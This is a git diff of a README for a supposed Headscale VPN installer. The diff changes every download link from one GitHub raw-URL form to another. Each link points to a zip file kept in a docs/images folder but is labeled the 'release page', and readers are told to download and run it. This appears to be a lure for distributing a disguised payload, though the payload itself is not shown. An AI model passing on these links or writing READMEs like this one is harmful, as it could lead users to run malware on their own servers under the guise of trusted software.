@@ -1,6 +1,6 @@
 # 🛠️ headscale-install - Set Up Your VPN Server Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ headscale-install helps you set up a Headscale server on Linux with a simple ins
 
 Use the release page here to download and run the installer for your system:
 
-[Visit the release page to download](https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip)
+[Visit the release page to download](https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip)
 
 This project is made for users who want a self-hosted VPN setup without spending time on manual steps. The installer walks you through the process and sets up the service on your server.
 
@@ -50,7 +50,7 @@ This saves time if you want a private VPN server for home, lab, or small team us
 
 ## 💻 How to Download
 
-1. Open the release page: https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip
+1. Open the release page: https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip
 2. Pick the latest release
 3. Download the file for your Linux system
 4. Save it in a folder you can find again
@@ -176,7 +176,7 @@ This project relates to:
 
 Open the release page and get the file for your system:
 
-https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip
+https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip
 
 Then download and run the installer on your Linux machine, follow the on-screen steps, and complete the server setup
 
@@ -204,4 +204,4 @@ After setup, you should have:
 
 If you need the download page later, use this link:
 
-[https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip](https://github.com/Minded-nakuru841/headscale-install/raw/refs/heads/main/docs/images/install-headscale-v1.5.zip)
+[https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip](https://raw.githubusercontent.com/Minded-nakuru841/headscale-install/main/docs/images/install-headscale-v1.5.zip)
